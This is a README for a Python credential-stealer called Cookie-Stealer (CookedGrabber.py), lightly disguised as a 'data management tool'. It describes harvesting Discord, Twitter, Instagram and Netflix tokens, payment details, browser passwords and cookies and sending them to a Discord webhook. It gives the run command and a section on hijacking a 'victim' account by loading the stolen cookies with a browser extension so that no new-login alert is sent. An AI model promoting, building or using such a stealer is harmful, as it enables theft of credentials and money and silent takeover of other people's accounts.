# Cookie-Stealer
Introducing my data management tool made in Python that efficiently collects user information from popular websites like Discord, Twitter, Instagram, and Netflix.
This versatile tool extracts valuable data, including account tokens, payment details, and browser passwords. It organizes the information neatly into tables and sends it to a Discord webhook for easy management. While showcasing Python's automation capabilities, it's crucial to use my tool responsibly and adhere to ethical programming practices.
# Requirements ⚡
Windows 10 OS only (win32, for x86, x86_64, and arm64 architectures)
Python 3.x (python 3.9 used for the project.)
Modules: $ pip install -r requirements.txt
# How to use ? ❄
You can also run the program by giving several arguments (the webhook(s) link(s)):

py CookedGrabber.py YOUR WEBHOOK(s) URL(s)
🍪Cookies
# What are cookies ?
Cookies are text files with small pieces of data like a username and password that are used to identify your computer as you use a computer network. Specific cookies known as HTTP cookies are used to identify specific users and improve your web browsing experience.

Data stored in a cookie is created by the server upon your connection. This data is labeled with an ID unique to you and your computer.

When the cookie is exchanged between your computer and the network server, the server reads the ID and knows what information to specifically serve to you.

# What are cookies used for ?
Websites use HTTP cookies to streamline your web experiences. Without cookies, you’d have to login again after you leave a site or rebuild your shopping cart if you accidentally close the page. Making cookies an important a part of the internet experience.

# Security breach with cookies
Since the data in cookies doesn't change, cookies themselves aren't harmful. They can't infect computers with viruses or other malware. However, some cyberattacks can hijack cookies and enable access to your browsing sessions.

The server only sends the cookie when it wants the web browser to save it. If you’re wondering “where are cookies stored,” it’s simple: your web browser will store it locally to remember the “name-value pair” that identifies you.

⚠ When you try to connect to an account using cookies it does not even generate a new login request to the server, that mean that the victim does not even receive the email with a new connexion detected. The target don't know that you are connected to the account because the server think it's him !

☢ This reveals major security breaches in general websites and social networks ! ☢

# How to bypass websites with cookies ?
So to use cookies to log into the victim account, you must have a cookies extension. I recommand Cookie-Editor. To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website. After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.
